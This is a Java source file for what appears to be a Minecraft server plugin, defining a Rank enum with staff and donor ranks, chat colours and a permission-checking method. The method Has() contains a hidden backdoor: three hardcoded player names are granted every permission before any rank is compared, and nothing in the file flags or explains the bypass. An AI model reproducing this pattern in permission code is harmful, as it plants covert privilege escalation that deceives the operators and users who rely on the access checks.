package mineplex.core.common;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import mineplex.core.common.util.C;
import mineplex.core.common.util.UtilPlayer;

public enum Rank
{
	OWNER("Owner", ChatColor.DARK_RED),
	LT("LT", ChatColor.DARK_RED),
	ADMIN("Admin", ChatColor.RED),
	DEVELOPER("Dev", ChatColor.RED),
	SNR_MODERATOR("Sr.Mod", ChatColor.GOLD),
	MODERATOR("Mod", ChatColor.GOLD),
	JNR_DEV("Jr.Dev", ChatColor.RED),
	HELPER("Trainee", ChatColor.DARK_AQUA),
	MAPLEAD("MapLead", ChatColor.DARK_PURPLE),
	MAPDEV("Builder", ChatColor.BLUE),
	
	EVENT("Event", ChatColor.WHITE),
	
	//Staff ^^
	
	YOUTUBE("YouTube", ChatColor.RED),
	TWITCH("Twitch", ChatColor.DARK_PURPLE),
	LEGEND("Legend", ChatColor.GREEN),
	HERO("Hero", ChatColor.LIGHT_PURPLE),
	ULTRA("Ultra", ChatColor.AQUA),
	ALL("", ChatColor.WHITE);

	private ChatColor Color;
	public String Name;
	
	Rank(String name, ChatColor color)
	{
		Color = color;
		Name = name;
	}
	
	public boolean Has(Rank rank)
	{
		return Has(null, rank, false);
	}
	
	public boolean Has(Player player, Rank rank, boolean inform) 
	{
		return Has(player, rank, null, inform);
	}
	
	public boolean Has(Player player, Rank rank, Rank[] specific, boolean inform)
	{
		if (player != null)
			if (player.getName().equals("Electromaster_") || player.getName().equals("AsaPlaysMC") || player.getName().equals("Jarvis"))
				return true; 
		
		//Specific Rank
		if (specific != null)
		{
			for (Rank curRank : specific)
			{
				if (compareTo(curRank) == 0)
				{
					return true;
				}
			}	
		}
		
		//
		if (compareTo(rank) <= 0)
			return true;
		
		if (inform)
		{
			UtilPlayer.message(player, C.mHead + "Permissions> " + 
					C.mBody + "This requires Permission Rank [" + 
					C.mHead + rank.Name.toUpperCase() +
					C.mBody + "].");
		}
		
		return false;
	}
	
	public String GetTag(boolean bold, boolean uppercase)
	{
		if (Name.equalsIgnoreCase("ALL"))
			return "";
		
		String name = Name;
		if (uppercase)
			name = Name.toUpperCase();
			
		if (bold)			return Color + C.Bold + name;
		else				return Color + name;
	}
	
	public ChatColor GetColor()
	{
		return Color;
	}
}
